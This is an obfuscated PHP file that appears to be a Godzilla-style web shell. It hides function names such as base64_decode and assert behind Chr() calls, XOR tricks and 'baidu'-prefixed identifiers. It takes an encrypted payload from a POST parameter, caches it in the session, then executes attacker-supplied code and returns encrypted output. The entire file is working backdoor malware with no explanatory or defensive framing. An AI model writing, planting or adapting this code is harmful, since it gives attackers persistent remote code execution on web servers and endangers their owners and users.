<?pHP
@session_start();
@set_time_limit(Chr('48'));
@error_reporting(Chr('48'));
function baiduV25TzcTH($baiduDWmfe2u1vZpH,$baidudJy2mY8SEauUu8){
    for($baiduS6CbJeB=Chr('48');$baiduS6CbJeB<strlen($baiduDWmfe2u1vZpH);$baiduS6CbJeB++) {
        $baidu6nmiyph = $baidudJy2mY8SEauUu8[$baiduS6CbJeB+Chr('49')&15];
        $baiduDWmfe2u1vZpH[$baiduS6CbJeB] = $baiduDWmfe2u1vZpH[$baiduS6CbJeB]^$baidu6nmiyph;
    }
    return $baiduDWmfe2u1vZpH;
}
$baiduvE7RgnCDl = 'bas'.'e6'.Chr('52').'_'.'de'.'cod'.Chr('101');
$base64_baiduV25TzcTH = 'bas'.'e6'.Chr('52').'_e'.Chr('110').Chr('99').'ode';
$baiduYpEbn05=('&'^'r').('7'^'V').('I'^':').('p'^'I').('_'^':').$baiduvE7RgnCDl($baiduvE7RgnCDl('Y2c9PQ=='));
$baiduTF5suTlHxkt6h73='p'.$baiduvE7RgnCDl($baiduvE7RgnCDl('WVhsc2IyRms='));
$baidu5zHGjjm9Q1='c1a3bc5c'.$baiduvE7RgnCDl('N2VjNWQ4ZWI=');
$baiduk3kn=('!'^'@').'ss'.Chr('101').'rs';
$baiduk3kn++;
if (isset($_POST[$baiduYpEbn05])){
    $datbaiduk3kn=baiduV25TzcTH($baiduvE7RgnCDl($_POST[$baiduYpEbn05]),$baidu5zHGjjm9Q1);
    if (isset($_SESSION[$baiduTF5suTlHxkt6h73])){
        $baiduk4tpHmUhFiqAaRy=baiduV25TzcTH($_SESSION[$baiduTF5suTlHxkt6h73],$baidu5zHGjjm9Q1);
        if (strpos($baiduk4tpHmUhFiqAaRy,$baiduvE7RgnCDl($baiduvE7RgnCDl('WjJWMFFtRnphV056U1c1bWJ3PT0=')))===false){
            $baiduk4tpHmUhFiqAaRy=baiduV25TzcTH($baiduk4tpHmUhFiqAaRy,$baidu5zHGjjm9Q1);
        }
		define('baiduOEpTkVAXByB','//baidu1VUW8Z\r\n'.$baiduk4tpHmUhFiqAaRy);
		$baiduk3kn(baiduOEpTkVAXByB);
        echo substr(md5($baiduYpEbn05.$baidu5zHGjjm9Q1),Chr('48'),16);
        echo $base64_baiduV25TzcTH(baiduV25TzcTH(@run($datbaiduk3kn),$baidu5zHGjjm9Q1));
        echo substr(md5($baiduYpEbn05.$baidu5zHGjjm9Q1),16);
    }else{
        if (strpos($datbaiduk3kn,$baiduvE7RgnCDl($baiduvE7RgnCDl('WjJWMFFtRnphV056U1c1bWJ3PT0=')))!==false){
            $_SESSION[$baiduTF5suTlHxkt6h73]=baiduV25TzcTH($datbaiduk3kn,$baidu5zHGjjm9Q1);
        }
    }
}
?>
